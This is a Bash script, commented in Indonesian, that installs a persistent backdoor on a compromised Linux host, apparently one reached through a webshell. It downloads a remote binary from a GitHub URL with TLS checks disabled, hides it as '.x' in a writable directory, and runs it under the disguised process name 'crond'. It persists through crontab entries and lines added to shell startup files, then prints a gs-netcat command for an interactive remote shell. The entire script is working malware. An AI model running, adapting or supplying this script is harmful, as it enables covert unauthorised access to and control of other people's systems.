#!/bin/bash

set -u

# ---- Config ----
URL="https://github.com/bkahwk-design/sutet/raw/refs/heads/main/sysd-helper"
SECRET="${1:-}"
HIDDEN_NAME="crond"                 # nama proses tersamar di ps
BIN_NAME=".x"                       # nama file tersamar

# ---- HOME fallback (webshell kadang gak set HOME) ----
[ -z "${HOME:-}" ] && export HOME="$(echo ~)"

# ---- Generate secret kalau kosong ----
if [ -z "$SECRET" ]; then
    SECRET=$(head -c 18 /dev/urandom 2>/dev/null | base64 2>/dev/null | tr -dc 'a-zA-Z0-9' | head -c 18)
    [ -z "$SECRET" ] && SECRET="auto$(date +%s)"
fi


CANDIDATES=(
    "$HOME/.config/htop"
    "$HOME/.local/bin"
    "$HOME/.cache"
    "$HOME/.config"
    "$HOME/tmp"
    "$HOME/.tmp"
    "$HOME/.ssh"
    "$HOME/public_html/.cache"
    "$HOME/public_html/tmp"
    "$HOME/public_html"
    "$HOME/www"
    "$HOME"
    "/var/lock"
    "/var/tmp"
    "/dev/shm"
    "/tmp"
)

find_dir() {
    local d t
    for d in "${CANDIDATES[@]}"; do
        [ -z "$d" ] && continue
        mkdir -p "$d" 2>/dev/null || continue
        # test: tulis file + chmod + eksekusi (cek writable & exec sekaligus)
        t="$d/.wxtest_$$"
        if printf '#!/bin/sh\nexit 0\n' > "$t" 2>/dev/null && chmod +x "$t" 2>/dev/null && "$t" 2>/dev/null; then
            rm -f "$t" 2>/dev/null
            echo "$d"
            return 0
        fi
        rm -f "$t" 2>/dev/null
    done
    return 1
}

BIN_DIR="$(find_dir)"
if [ -z "$BIN_DIR" ]; then
    echo "[!] gak ada dir writable+exec. Cek permission."
    exit 1
fi
BIN="$BIN_DIR/$BIN_NAME"


echo "[*] Dir     : $BIN_DIR"
echo "[*] Downloading binary ..."
if command -v curl >/dev/null 2>&1; then
    curl -fsSLk --connect-timeout 15 "$URL" -o "$BIN" 2>/dev/null
elif command -v wget >/dev/null 2>&1; then
    wget -q --no-check-certificate -T 15 "$URL" -O "$BIN" 2>/dev/null
else
    echo "[!] gak ada curl/wget" ; exit 1
fi


SZ=$(stat -c%s "$BIN" 2>/dev/null || echo 0)
if [ -z "$SZ" ] || [ "$SZ" -lt 1000000 ]; then
    echo "[!] Download gagal / file terlalu kecil ($SZ bytes). Cek URL."
    exit 1
fi
chmod 755 "$BIN"
echo "[+] Binary  : $BIN ($SZ bytes)"


pkill -f "$BIN" 2>/dev/null
sleep 1


cd "$BIN_DIR" || exit 1
if command -v setsid >/dev/null 2>&1; then
    setsid bash -c "exec -a '$HIDDEN_NAME' '$BIN' -s '$SECRET' -l -i -D" </dev/null >/dev/null 2>&1 &
else
    nohup bash -c "exec -a '$HIDDEN_NAME' '$BIN' -s '$SECRET' -l -i -D" </dev/null >/dev/null 2>&1 &
fi
sleep 2


( crontab -l 2>/dev/null | grep -v "$BIN" ; \
  echo "@reboot sleep 30; $BIN -s '$SECRET' -l -i -D 2>/dev/null" ; \
  echo "*/5 * * * * $BIN -s '$SECRET' -l -i -D 2>/dev/null" ) | crontab - 2>/dev/null


for rc in "$HOME/.bashrc" "$HOME/.bash_profile" "$HOME/.profile"; do
    if [ -f "$rc" ] 2>/dev/null; then
        grep -q "$BIN" "$rc" 2>/dev/null || echo "$BIN -s '$SECRET' -l -i -D >/dev/null 2>&1 &" >> "$rc" 2>/dev/null
    fi
done


echo
echo "=============================================="
echo "[+] DEPLOYED OK"
echo "[+] Secret : $SECRET"
echo "[+] Connect: gs-netcat -s \"$SECRET\" -i"
echo "=============================================="
